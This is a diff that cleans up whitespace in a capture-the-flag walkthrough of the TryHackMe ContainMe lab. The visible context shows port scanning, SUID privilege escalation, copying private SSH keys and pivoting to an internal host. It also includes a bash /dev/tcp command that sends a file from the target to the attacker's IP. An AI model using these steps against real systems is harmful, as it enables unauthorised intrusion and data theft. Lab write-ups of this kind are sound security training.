@@ -15,11 +15,9 @@ Hi I'm making [TryHackMe | ContainMe](https://tryhackme.com/room/containme1) roo
 
 ---
 
-
 ```bash
 export IP=10.10.84.234
 ```
-
 
 ```bash
 ❯ nmap -T4 -n -sC -sV -Pn -p- $IP
@@ -29,7 +27,7 @@ Host is up (0.068s latency).
 Not shown: 65531 closed tcp ports (conn-refused)
 PORT     STATE SERVICE       VERSION
 22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 a6:3e:80:d9:b0:98:fd:7e:09:6d:34:12:f9:15:8a:18 (RSA)
 |   256 ec:5f:8a:1d:59:b3:59:2f:49:ef:fb:f4:4a:d0:1d:7a (ECDSA)
 |_  256 b1:4a:22:dc:7f:60:e4:fc:08:0c:55:4f:e4:15:e0:fa (ED25519)
@@ -39,7 +37,7 @@ PORT     STATE SERVICE       VERSION
 2222/tcp open  EtherNetIP-1?
 |_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
 8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 38:39:87:29:ec:9f:b3:b7:3d:22:ef:67:f9:70:ca:ef (RSA)
 |   256 4e:9e:59:79:eb:7a:32:95:f6:17:3b:d5:12:0f:9d:9f (ECDSA)
 |_  256 ce:ba:ad:71:65:a1:de:13:47:11:30:a9:bf:23:e5:a9 (ED25519)
@@ -49,13 +47,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 712.36 seconds
 ```
 
-
-Firstly lets try fuyzzing the webserver using `gobuster`. 
-
-
+Firstly lets try fuyzzing the webserver using `gobuster`.
 
 ```bash
-❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt,bak -t 30 
+❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt,bak -t 30
 ===============================================================
 Gobuster v3.7
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -83,7 +78,7 @@ Finished
 I used -t `30` beacuse i was geting some timeouts.
 
 ```bash
-❯ curl $IP/index.php                    
+❯ curl $IP/index.php
 <html>
 <body>
 	<pre>
@@ -153,10 +148,8 @@ stty raw -echo;fg
 reset
 ```
 
-
-
 ```bash
-www-data@host1:/home/mike$ ls -la /home 
+www-data@host1:/home/mike$ ls -la /home
 total 12
 drwxr-xr-x  3 root root 4096 Jul 19  2021 .
 drwxr-xr-x 22 root root 4096 Jul 15  2021 ..
@@ -179,7 +172,7 @@ You can see there is a executable on mike's home directory.
 Lets try to execute that.
 
 ```bash
-www-data@host1:/home/mike$ ./1cryptupx 
+www-data@host1:/home/mike$ ./1cryptupx
 ░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
 ██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
 ██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
@@ -192,7 +185,6 @@ I guess we need to reverse engineer this binary.
 
 Lets download the binary to our machine and start reverse engineering.
 
-
 ```bash
 # On my machine
 ❯ nc -lvnp 5555 > binary
@@ -202,7 +194,6 @@ Connection received on 10.10.84.234 58730
 # On target
 www-data@host1:/home/mike$ bash -c 'cat 1cryptupx > /dev/tcp/10.21.206.128/5555'
 ```
-
 
 I firstly looked the strings of the binary
 
@@ -216,11 +207,10 @@ And it is packed with upx.
 
 But before starting to reverse engineering maybe ı need to try some strings into binary.
 
-
 This binary is not SUID even if we had reverse engineered this it would'nt mattered it anyways. I think there is probaly SUID version of this binary.
 
 ```bash
-www-data@host1:/usr/share/man/zh_TW$ find / -type f -perm /4000 2>/dev/null 
+www-data@host1:/usr/share/man/zh_TW$ find / -type f -perm /4000 2>/dev/null
 /usr/share/man/zh_TW/crypt
 /usr/bin/newuidmap
 /usr/bin/newgidmap
@@ -242,8 +232,8 @@ www-data@host1:/usr/share/man/zh_TW$ find / -type f -perm /4000 2>/dev/null
 /bin/fusermount
 /bin/ping6
 ```
-And we found the suid version of this binary lets try using it.
 
+And we found the suid version of this binary lets try using it.
 
 ```bash
 www-data@host1:/usr/share/man/zh_TW$ ./crypt root
@@ -266,7 +256,7 @@ www-data@host1:/usr/share/man/zh_TW$ ./crypt mike
 ╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
 ░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
 
-root@host1:/usr/share/man/zh_TW# 
+root@host1:/usr/share/man/zh_TW#
 ```
 
 And we got root by little luck.
@@ -289,9 +279,7 @@ drwx------  2 root root 4096 Jul 19  2021 .ssh
 
 What where is my flag.
 
-
 Lets try finding it with `find`
-
 
 ```bash
 root@host1:/root# find / -type f -name *flag*
@@ -348,11 +336,7 @@ find: '/sys/fs/fuse/connections/61': Permission denied
 /sys/module/scsi_mod/parameters/default_dev_flags
 ```
 
-
-
 There is no flag on this machine. I remember that there is 2 ssh ports open in that machine let get all the private ssh keys in the machine and try connecting to the ssh ports.
-
-
 
 ```bash
 root@host1:/home/mike/.ssh# cat id_rsa
@@ -369,9 +353,7 @@ And lets save that to our machine.
 
 There is no private key for root user but we can add our ssh public key for just safety.
 
-
 Now we can ssh into server.
-
 
 ```bash
 ❯ ssh root@$IP
@@ -379,19 +361,17 @@ Now we can ssh into server.
 
 We can ssh into that with root so we need to use ssh port 8022 for other target.
 
-
 ```bash
 ❯ ssh root@$IP -i mike.rsa -p 8022
-root@10.10.84.234's password: 
+root@10.10.84.234's password:
 
 ❯ ssh mike@$IP -i mike.rsa -p 8022
-mike@10.10.84.234's password: 
+mike@10.10.84.234's password:
 ```
 
 And it still asks me a password so maybe i was using wrong port maybe.
 
 Lets check that:
-
 
 ```bash
 root@host1:/root/.ssh# ifconfig
@@ -423,9 +403,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-
 And there is 2 ethernet connection. So I should ssh in inside of machine. Ok lets try that.
-
 
 ```bash
 root@host1:/home/mike/.ssh# ssh -i id_rsa mike@172.16.20.6
@@ -442,14 +420,12 @@ Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
 applicable law.
 
 Last login: Mon Jul 19 20:23:18 2021 from 172.16.20.2
-mike@host2:~$ 
+mike@host2:~$
 ```
 
 And we are in host2
 
-
 Lets try finding suid binaries again for privilage escalation:
-
 
 ```bash
 mike@host2:~$ find / -type f -perm /4000 2>/dev/null
@@ -476,9 +452,7 @@ mike@host2:~$ find / -type f -perm /4000 2>/dev/null
 
 Nothing we can use.
 
-
 Lets look at the services that are running:
-
 
 ```bash
 mike@host2:~$ service --status-all
@@ -509,9 +483,11 @@ mike@host2:~$ service --status-all
  [ + ]  udev
  [ + ]  unattended-upgrades
 ```
+
 Mysql and cron are running lets check them.
 
 Lets firstly try to log in on mysql
+
 ```bash
 mike@host2:~$ mysql --user=mike --password=*********
 mysql: [Warning] Using a password on the command line interface can be insecure.
@@ -527,12 +503,10 @@ owners.
 
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
-mysql> 
+mysql>
 ```
 
-
 And just trying basic passwords loged me in.
-
 
 ```bash
 mysql> show databases;
@@ -571,7 +545,6 @@ And we got passwords now.
 
 Lets log in as root.
 
-
 ```bash
 root@host2:~# ls -la
 total 28
@@ -587,18 +560,15 @@ drwx------  2 root root 4096 Jul 15  2021 .ssh
 
 And there is a zip file named mike.zip lets extract that
 
-
 ```bash
-root@host2:~# unzip mike.zip 
+root@host2:~# unzip mike.zip
 Archive:  mike.zip
-[mike.zip] mike password: 
-password incorrect--reenter: 
- extracting: mike                    
+[mike.zip] mike password:
+password incorrect--reenter:
+ extracting: mike
 ```
 
 And it has a password lets try using mike's password which is listed on the database.
-
-
 
 ```bash
 root@host2:~# ls -la
